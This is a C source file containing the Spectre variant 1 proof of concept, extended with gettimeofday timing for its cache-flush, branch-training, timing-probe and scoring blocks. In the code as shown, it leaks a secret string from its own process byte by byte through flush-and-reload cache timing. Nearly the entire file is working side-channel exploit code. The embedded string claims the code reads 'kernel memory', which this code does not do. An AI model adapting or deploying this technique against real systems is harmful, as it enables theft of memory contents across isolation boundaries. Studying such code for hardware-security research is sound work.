#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/time.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

/********************************************************************
Victim code.
********************************************************************/


unsigned int array1_size = 16;
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t array2[256 * 512]; // = 131072 = 4096 * 32
char * secret = "This code uses the Spectre vulnerability to access kernel memory";
uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

// Timing
long startTime;
long totalTimeIn1b=0;

void victim_function(size_t x) {
  if (x < array1_size) {
    temp &= array2[array1[x] * 512];
  }
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (120) /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
  struct timeval RMB_startTime, RMB_endTime, B1_startTime, B1_endTime, B2_startTime,
  B2_endTime, B3_startTime, B3_endTime, B4_startTime, B4_endTime;
  long timeArray[8] = {0,0,0,0,0,0,0,0};
  gettimeofday(&RMB_startTime, NULL);
  long RMB_time;

  static int results[256];
  int tries, i, j, k, mix_i, junk = 0;
  size_t training_x, x;
  register uint64_t time1, time2;
  volatile uint8_t * addr;

  for (i = 0; i < 256; i++)
    results[i] = 0;
  for (tries = 999; tries > 0; tries--) {
    //***************************************************
    //*******************Block 1*************************
    //***************************************************
    //*************** BLock 1a *************************
    gettimeofday(&B1_startTime, NULL);
    /* Flush array2[256*(0..255)] from cache */
    for (i = 0; i < 256; i++)
      _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */
  gettimeofday(&B1_endTime, NULL);
  //**************************************************

  //***************************************************
  //*******************Block 2*************************
  //***************************************************
  gettimeofday(&B2_startTime, NULL);
    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
    training_x = tries % array1_size; // allowed x within array1
    for (j = 29; j >= 0; j--) {
      _mm_clflush( & array1_size);
      for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */

      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
      /* Avoid jumps in case those tip off the branch predictor */
      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
      x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
      x = training_x ^ (x & (malicious_x ^ training_x));

      /* Call the victim! */
      victim_function(x);
    gettimeofday(&B2_endTime, NULL);
    //**************************************************

    }

    //***************************************************
    //*******************Block 3*************************
    //***************************************************
    gettimeofday(&B3_startTime, NULL);
    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = & array2[mix_i * 512];
      time1 = __rdtscp( & junk); /* READ TIMER */
      junk = * addr; /* MEMORY ACCESS TO TIME */
      time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
      if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
        results[mix_i]++; /* cache hit - add +1 to score for this value */
    }
    gettimeofday(&B3_endTime, NULL);
    //**************************************************

    //***************************************************
    //*******************Block 4*************************
    //***************************************************
    gettimeofday(&B4_startTime, NULL);
    /* Locate highest & second-highest results results tallies in j/k */
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || results[i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }
    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
      break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
    gettimeofday(&B4_endTime, NULL);
    //**************************************************
    timeArray[0] += ((B1_startTime.tv_sec * (int)1e6 + B1_startTime.tv_usec)-startTime);
    timeArray[1] += ((B1_endTime.tv_sec * (int)1e6 + B1_endTime.tv_usec)-startTime);

    timeArray[2] += ((B2_startTime.tv_sec * (int)1e6 + B2_startTime.tv_usec)-startTime);
    timeArray[3] += ((B2_endTime.tv_sec * (int)1e6 + B2_endTime.tv_usec)-startTime);

    timeArray[4] += ((B3_startTime.tv_sec * (int)1e6 + B3_startTime.tv_usec)-startTime);
    timeArray[5] += ((B3_endTime.tv_sec * (int)1e6 + B3_endTime.tv_usec)-startTime);

    timeArray[6] += ((B4_startTime.tv_sec * (int)1e6 + B4_startTime.tv_usec)-startTime);
    timeArray[7] += ((B4_endTime.tv_sec * (int)1e6 + B4_endTime.tv_usec)-startTime);
  }
  results[0] ^= junk; /* use junk so code above won’t get optimized out*/
  value[0] = (uint8_t) j;
  score[0] = results[j];
  value[1] = (uint8_t) k;
  score[1] = results[k];
  gettimeofday(&RMB_endTime, NULL);

  printf("RMB START: %ld\n", ((RMB_startTime.tv_sec * (int)1e6 + RMB_startTime.tv_usec)-startTime));

  printf("Block 1: %ld\n", timeArray[1]-timeArray[0]);

  printf("Block 2: %ld\n", timeArray[3]-timeArray[2]);

  printf("Block 3: %ld\n", timeArray[5]-timeArray[4]);

  printf("Block 4: %ld\n", timeArray[7]-timeArray[6]);

  printf("RMB END: %ld\n", ((RMB_endTime.tv_sec * (int)1e6 + RMB_endTime.tv_usec)-startTime));
}

int main(int argc,
  const char * * argv) {

  struct timeval currentTime;
  gettimeofday(&currentTime, NULL);
  startTime = currentTime.tv_sec * (int)1e6 + currentTime.tv_usec;

  size_t malicious_x = (size_t)(secret - (char * ) array1); /* default for malicious_x */
  int i, score[2], len = 40;
  uint8_t value[2];

  for (i = 0; i < sizeof(array2); i++)
    array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */

  while (--len >= 0) {
    readMemoryByte(malicious_x++, value, score);
   // printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
    printf("0x%02X='%c' score=%d ", value[0],
      (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
    if (score[1] > 0)
      printf("(second best: 0x%02X score=%d)", value[1], score[1]);
    printf("\n");
  }
  gettimeofday(&currentTime, NULL);
  printf("Program END: %ld\n", ((currentTime.tv_sec * (int)1e6 + currentTime.tv_usec)-startTime));
  printf("Total time in 1b: %ld\n", totalTimeIn1b);
  return (0);
}
